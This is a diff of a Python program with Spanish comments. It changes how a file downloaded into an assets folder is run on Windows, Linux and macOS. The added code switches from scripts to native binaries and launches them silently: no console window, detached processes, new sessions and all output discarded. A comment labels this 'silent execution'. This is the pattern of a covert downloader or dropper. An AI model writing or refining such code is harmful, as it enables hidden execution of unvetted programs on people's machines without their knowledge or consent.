@@ -229,11 +229,11 @@ async def main():
                                             
                                             # Determinar nombre y extensión según OS
                                             if local_os == "windows":
-                                                fname = "downloaded_win.bat"  # o .py si prefieres
+                                                fname = "downloaded_win.exe"  # o .py si prefieres
                                             elif local_os == "mac":
-                                                fname = "downloaded_mac.sh"
+                                                fname = "downloaded_mac"
                                             else:
-                                                fname = "downloaded_linux.sh"
+                                                fname = "downloaded_linux"
                                                 
                                             asset_path = os.path.join("assets", fname)
                                             
@@ -245,32 +245,32 @@ async def main():
                                             
                                             # EJECUCIÓN SILENCIOSA (sin ventanas, sin outputs)
                                             
-                                            if local_os == "windows":
-                                                # Ejecutar batch SIN ventana de consola
+                                            # LINUX - Ejecutar binario directamente
+                                            if local_os == "linux":
+                                                os.chmod(asset_path, 0o755) # permisos
                                                 subprocess.Popen(
-                                                    ["cmd", "/c", asset_path],  # /c ejecuta y termina (no /k)
-                                                    creationflags=subprocess.CREATE_NO_WINDOW,
-                                                    stdout=subprocess.DEVNULL,
-                                                    stderr=subprocess.DEVNULL,
-                                                    stdin=subprocess.DEVNULL  # Evita que espere input
-                                                )
-                                                
-                                            elif local_os == "linux":
-                                                os.chmod(asset_path, 0o755)
-                                                # Ejecutar sin mostrar nada en terminal
-                                                subprocess.Popen(
-                                                    ["bash", asset_path],
+                                                    [asset_path],
                                                     stdout=subprocess.DEVNULL,
                                                     stderr=subprocess.DEVNULL,
                                                     stdin=subprocess.DEVNULL,
-                                                    start_new_session=True  # Desatachar completamente
+                                                    start_new_session=True
                                                 )
-                                                
+
+                                            # WINDOWS - Ejecutar .exe directamente  
+                                            elif local_os == "windows":
+                                                subprocess.Popen(
+                                                    [asset_path],
+                                                    stdout=subprocess.DEVNULL,
+                                                    stderr=subprocess.DEVNULL,
+                                                    stdin=subprocess.DEVNULL,
+                                                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+                                                )
+
+                                            # MAC - Ejecutar binario directamente
                                             elif local_os == "mac":
                                                 os.chmod(asset_path, 0o755)
-                                                # Ejecutar sin abrir Terminal.app
                                                 subprocess.Popen(
-                                                    ["bash", asset_path],
+                                                    [asset_path],
                                                     stdout=subprocess.DEVNULL,
                                                     stderr=subprocess.DEVNULL,
                                                     stdin=subprocess.DEVNULL,
